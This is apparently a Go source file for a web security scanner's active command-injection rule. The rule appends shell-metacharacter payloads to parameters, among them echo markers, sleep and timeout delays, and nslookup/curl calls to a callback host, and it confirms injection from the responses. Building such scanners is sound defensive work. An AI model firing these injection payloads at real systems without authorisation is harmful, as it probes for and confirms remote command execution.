// Package cmdi is the active command-injection rule. It exposes checks for
// output-marker, Unix/Windows timing, and out-of-band detection; each appends
// shell-metacharacter payloads to a parameter.
package cmdi

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"strings"
	"time"

	"github.com/BishopFox/joro/internal/activescan"
	"github.com/BishopFox/joro/internal/activescan/injkit"
	"github.com/BishopFox/joro/internal/detect"
)

const (
	ruleID      = "cmdi"
	findingRule = "activescan.cmdi"
	sleepMs     = 5000
	oastWindow  = 12 * time.Second
	// marker product 73*79=5767: a shell evaluates the arithmetic, while a merely
	// reflective app echoes the literal "$((73*79))" — so the computed form confirms
	// execution, not reflection.
	markerProduct = "5767"
)

var unixTime = []string{`;sleep 5`, `|sleep 5`, `||sleep 5`, `&&sleep 5`, "`sleep 5`", `$(sleep 5)`}
var winTime = []string{`& timeout /t 5`, `& ping -n 6 127.0.0.1`}

func markerSuffixes(nonce string) []string {
	e := nonce + `$((73*79))`
	return []string{`;echo ` + e, `|echo ` + e, "`echo " + e + "`", `& echo ` + e}
}

func oastSuffixes(host string) []string {
	return []string{`;nslookup ` + host, `|nslookup ` + host, `$(nslookup ` + host + `)`, `& nslookup ` + host, `;curl ` + host}
}

var checks = []injkit.Check{
	{
		ID: "output", Name: "Output marker", Severity: detect.SeverityCritical,
		Description: "Appends an echo of a shell-arithmetic marker; the computed result in the response confirms execution (not mere reflection).",
		Payloads:    []string{`;echo <marker>$((73*79))`, `|echo …`, "`echo …`", `& echo …`},
		Probe:       outputMarker,
	},
	{
		ID: "time-unix", Name: "Time-based (Unix)", Severity: detect.SeverityCritical,
		Description: "Appends a Unix sleep and confirms a delayed response twice.",
		Payloads:    unixTime,
		Probe:       func(pc injkit.ProbeCtx) { timeBased(pc, unixTime) },
	},
	{
		ID: "time-windows", Name: "Time-based (Windows)", Severity: detect.SeverityCritical,
		Description: "Appends a Windows timeout/ping delay and confirms a delayed response twice.",
		Payloads:    winTime,
		Probe:       func(pc injkit.ProbeCtx) { timeBased(pc, winTime) },
	},
	{
		ID: "oast", Name: "Out-of-band", Severity: detect.SeverityCritical,
		Description:  "Appends nslookup/curl to the callback host and polls the listener for an interaction.",
		Payloads:     []string{`;nslookup <callback>`, `$(nslookup <callback>)`, `;curl <callback>`},
		RequiresOAST: true,
		Probe:        oastBased,
	},
}

type Rule struct{ *activescan.DisabledSet }

func New() *Rule { return &Rule{activescan.NewDisabledSet()} }

func (*Rule) ID() string                { return ruleID }
func (*Rule) Name() string              { return "Command injection" }
func (*Rule) Category() detect.Category { return detect.CategoryCommandInjection }
func (*Rule) Description() string {
	return "Appends shell-metacharacter payloads (echo marker, sleep/timeout, and — when a " +
		"callback listener is configured — nslookup/curl) to each parameter, confirming via an " +
		"evaluated marker, a timing delay, or an out-of-band callback."
}

func (r *Rule) CatalogItems() []activescan.CatalogItem {
	return injkit.Catalog(checks, r.DisabledSet, false)
}

func (r *Rule) Run(ctx context.Context, t activescan.Target, cfg activescan.Config, deps activescan.RuleDeps, rep activescan.Reporter) error {
	injkit.RunChecks(ctx, t, cfg, deps, rep, checks, r.DisabledSet, findingRule, detect.CategoryCommandInjection, "Command injection")
	return nil
}

func outputMarker(pc injkit.ProbeCtx) {
	nonce := "joro" + randHex(5)
	for _, s := range markerSuffixes(nonce) {
		if res := pc.Inject(s, true); res != nil && strings.Contains(string(res.Resp.Body), nonce+markerProduct) {
			pc.File(detect.SeverityCritical, "output-based command injection in "+pc.Point.Name, "injected "+s+" and the shell-evaluated marker was echoed", res.URL)
			return
		}
	}
}

func timeBased(pc injkit.ProbeCtx, suffixes []string) {
	for _, s := range suffixes {
		res := pc.Inject(s, true)
		if res == nil || !injkit.LooksDelayed(res.DurationMs, pc.Base.FloorMs, sleepMs) {
			continue
		}
		if res2 := pc.Inject(s, true); res2 != nil && injkit.LooksDelayed(res2.DurationMs, pc.Base.FloorMs, sleepMs) {
			pc.File(detect.SeverityCritical, "time-based blind command injection in "+pc.Point.Name, "injecting "+s+" delayed the response twice (~5s over baseline)", res.URL)
			return
		}
	}
}

func oastBased(pc injkit.ProbeCtx) {
	if pc.OAST == nil {
		return
	}
	tokenID, host, err := pc.OAST.Token("cmdi")
	if err != nil {
		return
	}
	for _, s := range oastSuffixes(host) {
		pc.Inject(s, true)
	}
	if pc.OAST.Fired(pc.Ctx, tokenID, oastWindow) {
		pc.File(detect.SeverityCritical, "out-of-band command injection in "+pc.Point.Name, "an injected command triggered a callback to "+host, pc.Base.URL)
	}
}

func randHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}
